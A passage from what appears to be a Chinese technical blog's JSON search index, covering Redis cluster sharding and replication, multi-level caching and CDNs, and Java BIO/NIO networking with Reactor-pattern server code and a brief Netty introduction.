\u0026#34;, err) return end if val == ngx.null then ngx.say(\u0026#34;key no found\u0026#34;) return end local ok, err = red:close() if not ok then ngx.say(\u0026#34;failed to close: \u0026#34;, err) return end ngx.say(json.encode({[key]=val})) 启动 Nginx 并指定配置文件。\n1 openresty -p `pwd`/ -c conf/nginx.conf 使用 HTTP 客户发送请求。\n1 2 % curl 127.0.0.1/redis/hello/world {\u0026#34;hello\u0026#34;:\u0026#34;world\u0026#34;} Nginx server 响应正常。\n本文首发于 https://h2cone.github.io\nMemo Inside NGINX\nThe Architecture of Open Source Applications (Volume 2): nginx\nNginx # development guide\nHTTP request processing phases in Nginx\nNginx # modules # lua\nOpenResty # Components\nlua-nginx-module\nlua-resty-redis\nOpenResty 最佳实践\nOpenResty 不完全指南\nLua Style Guide\n","date":"2020-03-31T14:44:18+08:00","permalink":"https://h2cone.github.io/2020/03/31/openresty-exp/","title":"使用 Lua 拓展 Nginx"},{"content":"铺垫 存储层次结构 自下而上，更小更快。\n自顶向下，更大更慢。\n上层是下层的（高速）缓存。\n软件系统三大目标 目标 解释 期望 战术 可靠性 容错能力 硬件故障、软件错误、人为失误发生时继续正常运作 熔断、降级、自动恢复、容灾、高可用、强一致性\u0026hellip;\u0026hellip; 可扩展性 应对负载增加的能力 负载增加时保持良好性能或高性能 低延迟、高吞吐、弹性伸缩\u0026hellip;\u0026hellip; 可维护性 运维和开发的难易程度 既简单又好拓展 DRY、SoC、DevOps\u0026hellip;\u0026hellip; Redis cluster 单一独立的 Redis 结点，虽然它真的很快（未来将开新篇章解释），但是也有上限，性能提升总将遇到天花板，而且单点故障将导致一段时间服务不可用。\nRedis 集群如何解决可靠性问题和扩展性问题？\n数据在多个 Redis 结点之间自动分片（shard）。\nRedis 集群可以在分区期间提供一定程度的可用性（availability）。\n水平扩展 Redis（scalability）。\n数据分片 Redis 集群不使用一致性哈希，而是使用哈希槽（hash slot）。\n如上图所示，Redis 集群中的结点（node）负责各自的哈希槽。向集群插入一个键（key）时，只是计算给定键的 CRC16 并取 16384 的模来将给定键映射到哈希槽。\n使用哈希槽可以“轻松”在集群中添加结点到删除结点。若增加一个结点 D，则从 A、B、C 移动一些哈希槽到 D，同理，若删除一个结点 A，则从 A 移动哈希槽到结点 B、C、D，当 A 为空可被完全从集群移除；而且，添加结点、删除结点、更改结点的哈希槽的百分比都不要求集群暂停运作，不需要任何停机时间。\n值得注意的是，Redis 集群支持多个键的操作，前提是单个命令执行或整个事务或 Lua 脚本执行中涉及的所有键属于同一个哈希槽。我们可以使用称为 hash tags 的概念来强制多个 key 映射到同一个哈希槽。\n可用性与一致性 Redis 集群使用主从模型（master-slave model） 实现故障转移。\n如上图所示，在集群创建时或稍后，我们给每个主结点添加从结点，例如 B 是主结点，B1 是它的从结点，B1 的哈希槽是 B 的哈希槽的副本。当 B 发生故障，集群将提升 B1 为新主结点，继续提供服务；以此类推，当有若干主结点发生故障时，它们的从结点将替代它们成为新主结点，以此提供一定程度的可用性。\n为什说是一定程度的可用性，考虑以下的场景，集群极可能不能正常运作。\n一对主从结点同时故障。\n超过半数的结点发生了故障。\nRedis 集群无法保证强一致性（strong consistency）。Kafka 的作者 Jay Kreps 曾经说过：\nIs it better to be alive and wrong or right and dead?\n在可用性与一致性天平之间，Redis 集群侧重于可用性。当一个客户端连接集群并写入键，丢失写（lose writes）可能发生，因为 Redis 使用异步复制（asynchronous replication）。\n客户端将给定键写入主结点 B\n主结点 B 发送 OK 给客户端\n从 B 复制数据到从结点 B1、B2、B3\u0026hellip;\u0026hellip;\n注意，上面操作 2 和操作 3 非阻塞，即客户端写的同时，主结点 B 执行数据复制任务（通常只需复制命令），而不是阻塞直到所有数据复制完成再回复客户端，数据复制必定存在滞后；当 B 发生故障停止复制且 B 的从结点提升为新主结点，新主结点将可能不存在客户端已写入的键。\n这也是一种在性能与一致性之间的权衡（trade-off）。\n即使 Redis 支持同步复制，也有其它更复杂的情景导致主结点与从结点数据不一致。一种情景是从结点提升为主结点时，客户端将可能找不到目标键或读取了脏数据；当客户端发送一次足够大的键或足够多的键到一个主结点，以至于该主结点的从结点有充分时间提升为新主结点，旧主结点将拒绝接受键，且新主结点不存在客户端写入的键。\n未来将开新篇章谈谈分布系统的一致性和可用性。\n最小的集群 从 antirez/redis 克隆。\n1 git clone -v https://github.com/antirez/redis.git 编译一下。\n1 2 cd redis make 编译成功后，可以使用名为 redis-server 的可执行文件启动单 Redis 实例。\n1 2 cd src ./redis-server 检查 utils/create-cluster 目录，可以发现一个名为 create-cluster 的 Shell 脚本，该脚本基于 Redis 集群创建和管理命令行工具：\n1 redis-cli --cluster 创建 Redis 集群需要先启动若干 Redis 实例。\n1 2 create-cluster start create-cluster create 截取以上脚本输出的一部分：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 M: 02f543ee55bb36c72816617d24aaf3c1438abdd1 127.0.0.1:30001 slots:[0-5460] (5461 slots) master 1 additional replica(s) S: c7dcf3932a10ea80cd67e1f350c328b272da1cf4 127.0.0.1:30006 slots: (0 slots) slave replicates 6b27d42f51f5991f2458be0bf48bc28691e71dd4 M: 6b27d42f51f5991f2458be0bf48bc28691e71dd4 127.0.0.1:30003 slots:[10923-16383] (5461 slots) master 1 additional replica(s) M: cf89f789b2347d73e91f035d0c6b3b5eef0d8414 127.0.0.1:30002 slots:[5461-10922] (5462 slots) master 1 additional replica(s) S: 0b6d6ade090167e47bb74d385548c6b787d52f71 127.0.0.1:30005 slots: (0 slots) slave replicates cf89f789b2347d73e91f035d0c6b3b5eef0d8414 S: 0166962044b5fa13cf64d0c968963e5ee63f3241 127.0.0.1:30004 slots: (0 slots) slave replicates 02f543ee55bb36c72816617d24aaf3c1438abdd1 默认情况下，总共 6 个结点，3 个 主结点（M），3 个 从结点（S），更多用法请参考 utils/create-cluster/README。\n我们使用 redis-cli 试验一下自动数据分片。\n1 2 3 4 % redis-cli -c -p 30001 127.0.0.1:30001\u0026gt; set foo bar -\u0026gt; Redirected to slot [12182] located at 127.0.0.1:30003 OK 1 2 3 4 % redis-cli -c -p 30003 127.0.0.1:30003\u0026gt; set hello world -\u0026gt; Redirected to slot [866] located at 127.0.0.1:30001 OK 当查找键时，可能返回错误信息，提示我们转而连接其它结点。\n1 2 3 % redis-cli -p 30002 127.0.0.1:30002\u0026gt; get foo (error) MOVED 12182 127.0.0.1:30003 1 2 3 redis-cli -p 30003 127.0.0.1:30003\u0026gt; get foo \u0026#34;bar\u0026#34; 当然，redis-cli 支持重定向。\n1 2 3 4 5 6 7 % redis-cli -c -p 30002 127.0.0.1:30002\u0026gt; get foo -\u0026gt; Redirected to slot [12182] located at 127.0.0.1:30003 \u0026#34;bar\u0026#34; 127.0.0.1:30003\u0026gt; get hello -\u0026gt; Redirected to slot [866] located at 127.0.0.1:30001 \u0026#34;world\u0026#34; 访问 Redis 集群的应用程序无法直接使用命令行工具，应用程序的 Redis 客户端需要以 Redis 集群的协议与 Redis 实例通信。在 Java 生态中，Jedis 已支持 Redis 集群。\n1 2 3 4 5 6 Set\u0026lt;HostAndPort\u0026gt; jedisClusterNodes = new HashSet\u0026lt;HostAndPort\u0026gt;(); //Jedis Cluster will attempt to discover cluster nodes automatically jedisClusterNodes.add(new HostAndPort(\u0026#34;127.0.0.1\u0026#34;, 7379)); JedisCluster jc = new JedisCluster(jedisClusterNodes); jc.set(\u0026#34;foo\u0026#34;, \u0026#34;bar\u0026#34;); String value = jc.get(\u0026#34;foo\u0026#34;); 客户端路由 一个严肃的客户端除了实现重定向或路由，还应该缓存哈希槽与结点地址之间的映射（进程内缓存或本地缓存），直接连接正确的结点（减小重定向频率）。发生故障转移之后或系统管理员增加或删除结点之后，客户端需要刷新映射。\n代理分发 客户端与一群 Redis 实例交流能否简化成与单一 Redis 实例交流？答案是增加一个中间层。\n代理（Proxy），比如 Redis Cluster Proxy 和 CodisLabs/codis，但是，代理通常也要提供一定程度的可用性。\n容器化 为了使 Docker 与 Redis 集群兼容，需要使用 Docker 的 host networking mode，详情请见 docker # network。\n组合拳 在高负载下的分布式系统中，我们通常考虑使用 Redis 作为 MySQL 等关系型数据库的（高速）缓存，虽然应用程序都要与它们通信，但是 Redis 访问内存要比数据库访问磁盘快得多，转而解决开头所说的三大问题；但仍然不是最优方案，再如开头所说，我们可以利用更上层的（高速）缓存，应用程序与 Redis 集群的网络开销可以通过进程内缓存或本地缓存进一步降低。\n例如，J2Cache，它将 Java 进程缓存框架作为一级缓存（比如 Ehcache），将 Redis 作为二级缓存。查找键时，先查找一级缓存，若一级缓存未命中则查找二级缓存。那么它如何解决一致性问题和可靠性问题？\n它可以使用 Redis 的发布/订阅（类似消息中间件的特性）来保证多个应用程序实例之间一定程度的缓存一致性，一定程度是因为 Redis 官方说将来有计划支持更可靠的消息传递；所谓可靠的消息传递，类比 TCP 可靠传输的基本思想，即确认、超时、重传等概念。\nCDN Content delivery network，即内容分发网络，不容忽视的大规模分布式多级缓存系统。\n如上面这张来自维基百科的插图所示，左手边是单服务器分发，右手边是 CDN 分发。CDN 结点通常部署在多个位置，CDN 系统能够在算法上将浏览器的请求导向离用户最近或最佳的 CDN 结点，浏览器则配合系统就近访问结点。使用 CDN 至少具有如下优势：\n降低带宽成本。 缩短响应时间。 提高内容的的全球性。 CDN 系统是（回）源主机及其 Web 服务器的（高速）缓存，CDN 系统适合缓存的内容是文件。\n本文首发于 https://h2cone.github.io\n参考资料 Redis cluster tutorial\nRedis Cluster Specification\n生产环境下的 redis 集群一般是如何部署的？\nA Few Notes on Kafka and Jepsen\nGuava\u0026rsquo;s cache\nSpring cache\nJ2Cache 和普通缓存框架有何不同，它解决了什么问题？\n扒掉红薯的内裤-深入剖析J2Cache\nRedis # documentation\nredisson/redisson\nCDN是什么？使用CDN有什么优势？\n","date":"2020-03-24T17:40:48+08:00","permalink":"https://h2cone.github.io/2020/03/24/distributed-cache/","title":"分布式缓存"},{"content":"I/O 本文以多线程·并发编程中的第一张图作为开篇：\nI/O 设备包括鼠标、键盘、显示器、磁盘、网卡等。\nI/O（输入/输出），输入是从 I/O 设备复制数据到主存，输出是从主存复制数据到 I/O 设备。\n从一个计算机角度来看，网络（适配器）是它的一个 I/O 设备。当计算机系统从主存复制字节序列到网络适配器时，数据流经过网络到达另一台机器，同理，计算机系统可以从网络适配器复制字节序列到主存。\nSocket 从人类的角度来看，计算机网络由一台或多台机器组成。网络中，数据从一台机器传输到另一个机器的方式通常是分组交换，即数据被切分成适合传输的小块数据，小块数据都有各自的编号；它们从一个端点分道扬镳，但殊途同归，到另一个端点时，重新排列组合成完整数据。分组交换的好处之一是充分利用网络带宽，而当 TCP 连接空闲时，通常不占用任何带宽。\n分组交换有可能出现数据的丢失、乱序、重复，如何检测、重传、缓存，实现可靠性传输是 TCP 的目标。别问，问就是三次握手、四次挥手、滑动窗口协议、拥塞控制算法\u0026hellip;\u0026hellip;\nTCP/IP 协议族对普通程序员来说足够复杂，但是，David Wheeler 曾经说过：\nAll problems in computer science can be solved by another level of indirection.\nSocket 是进程与传输层的中间层。\nSocket 包含五元组 (client ip, client port, server ip, server port, protocol)。\n同在传输层的 UDP 不如 TCP 可靠，但是轻量级，因为它没有确认、超时、重传的概念，也没有拥塞控制，而且无连接，从而能广播。\nSocket 隐藏了下层具体实现的复杂性，并给上层提供了简单或统一的 API。下图是 TCP Socket 基本流程，使用 伯克利 Sockets 描述。\nUnix 的主题是“一切都是文件”。当进程申请访问 Socket 时，内核则提供相应的文件描述符（int 变量），进程发起系统调用并传递相应的文件描述符来读写 Socket。\nJava 网络编程 BIO Java 的 BIO 是指 blocking I/O，通常指 java.io 包组合 java.net 包。\n模型 上图来自服务化基石之远程通信系列三：I/O模型。基于 Java BIO 的服务器端程序，通常一个客户端（Client）向服务器端（Server）发起的请求由一个线程处理，回想前文的 TCP Socket 基本流程图，那么线程与 Socket 的关系如下：\n处理请求，通常都可以分解为：\n接收请求（receive/read） 解码请求（deocode） 计算/处理（compute/process） 编码响应（encode） 发送响应（send/wirte） 其中 1 和 5 必定是 I/O 操作，回想前文所说的 I/O 操作的本质，即字节序列的来向和去向，来向与去向在 java.io 中的常见类型是 InputStream 和 OutputStream，I/O Stream 表示输入源或输出目的地。\n基于 Java BIO 的服务器端程序之所以使用线程池（ThreadPool），理由请参考多线程·并发编程 # Java 多线程 # 线程池。\nServer 以上内容结合 java.net 的 Socket API，足以编写典型的 Java BIO 服务器端程序：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 class Server implements Runnable { final int port; final Executor executor; final Processable processable; public Server(int port, Executor executor, Processable processable) { this.port = port; this.executor = executor; this.processable = processable; } @Override public void run() { try { ServerSocket serverSocket = new ServerSocket(port); while (!Thread.interrupted()) { Socket socket = serverSocket.accept(); executor.execute(new Handler(socket, processable)); } } catch (IOException e) { e.printStackTrace(); } } static class Handler implements Runnable { final Socket socket; final Processable processable; public Handler(Socket socket, Processable processable) { this.socket = socket; this.processable = processable; } @Override public void run() { processable.process(socket); } } @Deprecated interface Processable { void process(Socket socket); } } 注意 Server 的 run 方法，为什么使用 ServerSocket 循环？首先 accept() 是阻塞方法，表现为一个线程调用该方法时被阻塞在该方法，直到 ServerSocket 准备好接受（accpet）客户端发起的连接（connect）时方法返回，该线程退出该方法，返回值的类型是 Socket，表示客户端的 Socket 副本。然后，该线程命令工作线程处理 Socket，这里用 Handler 的 run 方法作为工作线程的任务，根据 Executor 的一般实现，execute() 非阻塞，立即返回。最后，继续循环。因此，如果没有工作线程且只有一个线程，容易出现该线程正在处理一个 Socket 而无法脱身去处理其它客户端的请求（供不应求）。\n建议使用日志框架代替 e.printStackTrace() 和 System.out.print*，还有合理设置线程池的参数，仅仅为了方便展示，采用以下方式启动 Server：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 public static void main(String[] args) { int port = args.length == 0 ? 8080 : Integer.parseInt(args[0]); Server server = new Server(port, Executors.newCachedThreadPool(), (socket) -\u0026gt; { try (InputStream input = socket.getInputStream(); OutputStream output = socket.getOutputStream()) { // read int len; byte[] buf = new byte[1024]; if ((len = input.read(buf)) != -1) { String msg = new String(buf, 0, len); System.out.printf(\u0026#34;%s receive \u0026#39;%s\u0026#39; from %s\\n\u0026#34;, Thread.currentThread().getName(), msg, socket.toString()); // consuming Thread.sleep(DELAY_TIME); // write msg = String.format(\u0026#34;i am %s\u0026#34;, Thread.currentThread().getName()); output.write(msg.getBytes()); output.flush(); } } catch (IOException | InterruptedException e) { e.printStackTrace(); } }); new Thread(server).start(); System.out.printf(\u0026#34;server running on %s\\n\u0026#34;, port); } 处理 Socket 的过程首先是使用 Socket 得到 InputStream 和 OutputStream，然后从中读取字节数组，解码为字符串，打印表示收到了客户端发送的数据，最后以“自我介绍”回复客户端。注意，调用 read 方法将阻塞，直到输入数据可用或检测到 EOF 或引发异常为止。\n多客户端可以用多线程模拟。客户端先向服务器端发送“自我介绍”，然后尝试读取来自服务器端的消息：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 public class BioClient { public static int NUMBER_OF_CLIENTS = 8; public static void main(String[] args) { String host = args.length == 0 ? \u0026#34;127.0.0.1\u0026#34; : args[0]; int port = args.length == 0 ? 8080 : Integer.parseInt(args[1]); Runnable runnable = () -\u0026gt; { try { Socket socket = new Socket(host, port); try (OutputStream output = socket.getOutputStream(); InputStream input = socket.getInputStream()) { // write String msg = String.format(\u0026#34;i am %s\u0026#34;, Thread.currentThread().getName()); output.write(msg.getBytes()); output.flush(); // read int len; byte[] buf = new byte[1024]; if ((len = input.read(buf)) != -1) { msg = new String(buf, 0, len); System.out.printf(\u0026#34;%s receive \u0026#39;%s\u0026#39; from %s\\n\u0026#34;, Thread.currentThread().getName(), msg, socket.toString()); } } } catch (IOException e) { e.printStackTrace(); } }; for (int i = 0; i \u0026lt; NUMBER_OF_CLIENTS; i++) { new Thread(runnable).start(); } } } 基于 Java NIO 的服务器端程序，虽然使用了线程池，但是处理 Socket 普遍存在阻塞 I/O，工作线程被阻塞或被迫等待较长时间，且一个 Socket 由一个线程处理，即线程工时利用率较低，单个这种服务器端程序应对负载增加（C10K ~ C100K）的能力并不是最优化。\nNIO Java 的 NIO 是指 non-blocking I/O 或 New I/O，通常指 java.nio 包组合 java.net 包。\n模型 上图来自服务化基石之远程通信系列三：I/O模型。Java NIO 致力于用比 Java BIO 更少的线程处理更多的连接。比如，一个不希望被老板开除的店小二将一位客人的订单交给后厨后，不会只等待后厨做好相应的菜然后上菜，而是立即去接待其它客人入座、点餐、结账等，若店小二观察到后厨做菜完成后则上菜或者后厨做菜完成后通知店小二上菜。\nJava NIO 有三大核心组件：\nChannels。支持非阻塞读写 Channel 关联的文件或 Socket。\nBuffers。可以从 Channel 直接读取或直接写入 Channel 的类似数组的对象。\nSelectors。判断一组 Channel 中哪些发生了用户感兴趣的 I/O 事件。\n一些不容忽视：\nSelectionKeys。维护 I/O 事件状态和附件。\nServerSocketChannel。代替 ServerSocket。\nSocketChannel。代替 Socket。\nChannel\u0026amp;Selector Selector 是线程和 Channel 的中间层，多个连接可由一个线程处理。\nSelectionKey 定义了四种 I/O 事件： OP_READ、OP_WRITE、OP_CONNECT、OP_ACCEPT，均符合伯克利 Sockets 的语义，OP_CONNECT 为客户端专有，OP_ACCEPT 为服务器端专有。\nOP_ACCEPT。ServerSocketChannel 接受就绪。\nOP_READ。例如，SocketChannel 读就绪。\nOP_WRITE。例如，SocketChannel 写就绪。\nBuffer Buffer 维护了 position、limit、capacity 变量，具有写模式和读模式。\n写模式。position 为 0，limit 等于 capacity，每插入一个元素，position 增加 1。\n读模式。由读模式转换为写模式时，limit 设为 position，position 归零。\nByteBuffer 的写入和读取通常经历如下步骤：\n将字节数组写入 ByteBuffer。\n调用 flip()，转换为读模式。\n从 ByteBuffer 读取字节数组。\n调用 clear() 或 compact() 清空 ByteBuffer。\nChannel 已提供直接从中读取 ByteBuffer 或直接写入其中的方法。\n值得一提的是，ByteBuffer 支持分配直接字节缓冲区，即堆外内存。\n1 2 3 public static ByteBuffer allocateDirect(int capacity) { return new DirectByteBuffer(capacity); } 1 2 3 4 5 public static ByteBuffer allocate(int capacity) { if (capacity \u0026lt; 0) throw new IllegalArgumentException(); return new HeapByteBuffer(capacity, capacity); } DirectByteBuffer 通常比 HeapByteBuffer 内存复制次数更少。以写 Socket 为例，JVM 先从堆中复制数据到进程缓冲区，操作系统内核再从进程缓冲区复制数据到内核缓冲区，然后从内核缓冲区复制数据到 I/O 设备。如果分配直接缓冲区，那么就减去了从堆复制数据到进程缓冲区的操作。allocateDirect 方法使用了 sun.misc.Unsafe#allocateMemory 方法，这种方法返回的缓冲区通常比非直接缓冲区具有更高的分配和释放成本，因为堆外内存在 GC 范围之外，即使 java.nio.DirectByteBuffer 实现了自己的缓冲区对象管理，仍然有堆外内存泄露的风险，通常要考虑以下的 JVM 选项：\n1 -XX:MaxDirectMemorySize=size 一个直接字节缓冲区也可以通过将文件区域直接 mapping 到内存中来创建，原理是 mmap。\nReactor 根据上文的知识，足以实现典型的 Java NIO 服务器端程序，但是我把它删掉了；因为它表现得不如上文典型的 Java BIO 的服务器端程序，更因为我读到了 Doug Lea 讲的 Reactor 模式（链接在文章末尾），常翻 JDK 源码可以发现他是大部分并发数据结构的作者。\n单线程版 若用 Java 语言来描述上图，基本的 Reactor 模式如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 class Reactor implements Runnable { final Selector selector; final ServerSocketChannel serverSocketChannel; final ChannelHandler channelHandler; public Reactor(int port, ChannelHandler channelHandler) throws IOException { selector = Selector.open(); serverSocketChannel = ServerSocketChannel.open(); serverSocketChannel.socket().bind(new InetSocketAddress(port)); serverSocketChannel.configureBlocking(false); SelectionKey selectionKey = serverSocketChannel.register(selector, SelectionKey.OP_ACCEPT); selectionKey.attach(new Acceptor()); // (1) this.channelHandler = channelHandler; } @Override public void run() { try { while (!Thread.interrupted()) { selector.select(); Set\u0026lt;SelectionKey\u0026gt; selectionKeys = selector.selectedKeys(); Iterator\u0026lt;SelectionKey\u0026gt; iterator = selectionKeys.iterator(); while (iterator.hasNext()) { SelectionKey selectionKey = iterator.next(); dispatch(selectionKey); // (2) iterator.remove(); } selectionKeys.clear(); } } catch (IOException e) { e.printStackTrace(); } } private void dispatch(SelectionKey selectionKey) { Runnable runnable = (Runnable) selectionKey.attachment(); if (runnable != null) { runnable.run(); // (3) } } class Acceptor implements Runnable { @Override public void run() { try { SocketChannel socketChannel = serverSocketChannel.accept(); if (socketChannel != null) { new Handler(selector, socketChannel, channelHandler); // (4) } } catch (IOException e) { e.printStackTrace(); } } } static class Handler implements Runnable { final SelectionKey selectionKey; final SocketChannel socketChannel; final ChannelHandler channelHandler; ByteBuffer inputBuf = ByteBuffer.allocate(1024); ByteBuffer outputBuf = ByteBuffer.allocate(1024); static int READING = 0, WRITING = 1; int state = READING; public Handler(Selector selector, SocketChannel socketChannel, ChannelHandler channelHandler) throws IOException { this.socketChannel = socketChannel; this.socketChannel.configureBlocking(false); // (5) selectionKey = this.socketChannel.register(selector, 0); selectionKey.attach(this); selectionKey.interestOps(SelectionKey.OP_READ); selector.wakeup(); this.channelHandler = channelHandler; } @Override public void run() { try { if (state == READING) { read(); } else if (state == WRITING) { write(); } } catch (Exception e) { e.printStackTrace(); } } private void read() throws IOException { channelHandler.read(socketChannel, inputBuf); if (channelHandler.inputCompleted(inputBuf)) { channelHandler.process(inputBuf, outputBuf); state = WRITING; selectionKey.interestOps(SelectionKey.OP_WRITE); } } private void write() throws IOException { channelHandler.write(socketChannel, outputBuf); if (channelHandler.outputCompleted(outputBuf)) { selectionKey.cancel(); // (6) } } } } （1）Reactor 构造器。使用 serverSocketChannel 注册 selector 并添加感兴趣的 I/O 事件（OP_ACCEPT）之后，返回得到一个 selectionKey，selectionKey 可添加一个附件，这个附件是 Acceptor 对象的引用。\n（2）分派循环。首先，调用 selector.select() 时阻塞，直到选中了一组已准备好进行 I/O 操作的 Channel 所对应的键（SelectionKey），初始只对 OP_ACCEPT 感兴趣。然后，迭代得到相应的键，因为一开始只有一个 Channel，所以当前键集合大小为 1，调用 dispatch 时得到的键的附件即是 Acceptor 对象的引用。\n（3）分派方法。由（2）可知，Acceptor 的 run 方法被调用，但不直接启动新线程。\n（4）Acceptor 运行方法。传递 selector 和 socketChannel 来新建 Handler 对象，不直接调用其 run 方法，而是返回到分派循环。\n（5）Handler 构造器。用当前的 socketChannel 注册 selector 并添加感兴趣的 I/O 事件（OP_READ）和附件（Handler 对象的引用），但要注意唤醒 selector，使尚未返回的第一个 select 操作立即返回，理由是有新的 Channel 加入。\n（6）Handler 运行方法。在分派循环中，若可读的 socketChannel 对应的键被选中，则该键的附件，即 Handler 对象的 run 方法被调用，对 Channel 进行非阻塞读写操作，中间还有 process 方法（业务逻辑），写完之后取消该键关联的 socketChannel 对 selector 的注册。\n在 Java NIO 中，对 Channel 的读写是非阻塞方法（直接执行且立即返回，但稍后再执行），通常要判断输入是否完成（inputCompleted），完成后进行业务逻辑处理（process），以及判断输出是否完成（outputCompleted），完成后注销（短连接）。\n1 2 3 4 5 6 7 8 9 10 11 12 13 public interface ChannelHandler { void read(SocketChannel socketChannel, ByteBuffer inputBuf) throws IOException; boolean inputCompleted(ByteBuffer inputBuf); void process(ByteBuffer inputBuf, ByteBuffer outputBuf); void write(SocketChannel socketChannel, ByteBuffer outputBuf) throws IOException; boolean outputCompleted(ByteBuffer outputBuf); } 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 public class DefaultChannelHandler implements ChannelHandler { public static final String SEND = \u0026#34;i am %s\u0026#34;; public static final String RECEIVE = \u0026#34;%s receive \u0026#39;%s\u0026#39;\u0026#34;; @Override public void read(SocketChannel socketChannel, ByteBuffer inputBuf) throws IOException { socketChannel.read(inputBuf); } @Override public boolean inputCompleted(ByteBuffer inputBuf) { return inputBuf.position() \u0026gt; 2; } @Override public void process(ByteBuffer inputBuf, ByteBuffer outputBuf) { try { inputBuf.flip(); String msg = Charset.defaultCharset().newDecoder().decode(inputBuf).toString(); System.out.printf(RECEIVE + \u0026#34;\\n\u0026#34;, Thread.currentThread().getName(), msg); // consuming Thread.sleep(BioServer.DELAY_TIME); msg = String.format(SEND, Thread.currentThread().getName()); outputBuf.put(ByteBuffer.wrap(msg.getBytes())); } catch (IOException | InterruptedException e) { e.printStackTrace(); } } @Override public void write(SocketChannel socketChannel, ByteBuffer outputBuf) throws IOException { outputBuf.flip(); socketChannel.write(outputBuf); } @Override public boolean outputCompleted(ByteBuffer outputBuf) { return !outputBuf.hasRemaining(); } } 仅仅为了方便展示，采用以下方式启动 Reactor：\n1 2 3 4 5 6 7 8 public static void main(String[] args) throws IOException { int port = args.length == 0 ? 8080 : Integer.parseInt(args[0]); ExecutorService executorService = Executors.newSingleThreadExecutor(); executorService.execute(new Reactor(port, Executors.newCachedThreadPool(), new DefaultChannelHandler())); System.out.printf(\u0026#34;server running on %s\\n\u0026#34;, port); } 一图胜千言。\n与上文 BIO 客户端程序类似，也模拟多客户端。客户端先向服务器端发送“自我介绍”，然后尝试读取来自服务器端的消息：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 public class Client { public static void main(String[] args) { String host = args.length == 0 ? \u0026#34;127.0.0.1\u0026#34; : args[0]; int port = args.length == 0 ? 8080 : Integer.parseInt(args[1]); SocketAddress socketAddress = new InetSocketAddress(host, port); Runnable runnable = () -\u0026gt; { try { SocketChannel socketChannel = SocketChannel.open(socketAddress); socketChannel.configureBlocking(true); // write String msg = String.format(DefaultChannelHandler.SEND, Thread.currentThread().getName()); ByteBuffer buffer = ByteBuffer.wrap(msg.getBytes()); socketChannel.write(buffer); // read buffer = ByteBuffer.allocate(1024); socketChannel.read(buffer); if (buffer.position() \u0026gt; 0) { buffer.flip(); msg = Charset.defaultCharset().newDecoder().decode(buffer).toString(); System.out.printf(DefaultChannelHandler.RECEIVE + \u0026#34;\\n\u0026#34;, Thread.currentThread().getName(), msg); } } catch (IOException e) { e.printStackTrace(); } }; for (int i = 0; i \u0026lt; BioClient.NUMBER_OF_CLIENTS; i++) { new Thread(runnable).start(); } } } 多线程版 仔细审视单线程版可以发现，accept、read、process、write 都只由一个线程执行，但是应对高并发时单线程工作能力有限。如果它读完了一个 Channel 后在 process 中执行耗时任务，那么就没有空闲时间进行其它 Channel 的 accept、read、write 操作；因此，使用 Boss/Reactor 线程执行非阻塞的 accept、read、write 操作，命令工作线程执行耗时的 process 操作，充分消费多处理器来提高程序性能。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 static class Handler implements Runnable { final Selector selector; final SelectionKey selectionKey; final SocketChannel socketChannel; final ChannelHandler channelHandler; ByteBuffer inputBuf = ByteBuffer.allocate(1024); ByteBuffer outputBuf = ByteBuffer.allocate(1024); static int READING = 0, PROCESSING = 1, WRITING = 2; int state = READING; final Executor executor; public Handler(Selector selector, SocketChannel socketChannel, Executor executor, ChannelHandler channelHandler) throws IOException { this.selector = selector; this.socketChannel = socketChannel; this.socketChannel.configureBlocking(false); selectionKey = this.socketChannel.register(selector, 0); selectionKey.attach(this); selectionKey.interestOps(SelectionKey.OP_READ); selector.wakeup(); this.executor = executor; this.channelHandler = channelHandler; } @Override public void run() { try { if (state == READING) { read(); } else if (state == PROCESSING) { processAndHandOff(); } else if (state == WRITING) { write(); } } catch (IOException e) { e.printStackTrace(); } } private synchronized void read() throws IOException { channelHandler.read(socketChannel, inputBuf); if (channelHandler.inputCompleted(inputBuf)) { state = PROCESSING; executor.execute(this::processAndHandOff); } } private synchronized void processAndHandOff() { channelHandler.process(inputBuf, outputBuf); state = WRITING; selectionKey.interestOps(SelectionKey.OP_WRITE); selector.wakeup(); } private void write() throws IOException { channelHandler.write(socketChannel, outputBuf); if (channelHandler.outputCompleted(outputBuf)) { selectionKey.cancel(); } } } 在单线程版的基础上更改 Handler，然后用以下方式启动 Reactor（建议合理设置线程池的参数）：\n1 2 ExecutorService executorService = Executors.newSingleThreadExecutor(); executorService.execute(new Reactor(port, Executors.newCachedThreadPool(), new DefaultChannelHandler())); 进一步扩展，甚至可以同时运行两个 Boss/Reactor 线程，主 Reactor 线程负责 accept，分派已接受的 Channel 给子 Reactor 线程 read 和 write，子 Reactor 线程命令工作线程 process。\n一般的开发人员直接使用 Java NIO 编写服务器端或客户端，既要保证可靠，又要保证高性能，实属不易，终于到了主角登场的时候。\nNetty Netty 是异步、事件驱动网络应用程序框架，用于快速开发可维护的高性能协议服务器端和客户端。\n如何使用 Netty，参考 Netty # Wiki、netty/netty/tree/4.1/example、normanmaurer/netty-in-action 。下文则更关注如何理解 Netty 4.x 的核心（Core）。\nBootstrapor or ServerBootstrap EventLoop EventLoopGroup ChannelPipeline Channel Future or ChannelFuture ChannelInitializer 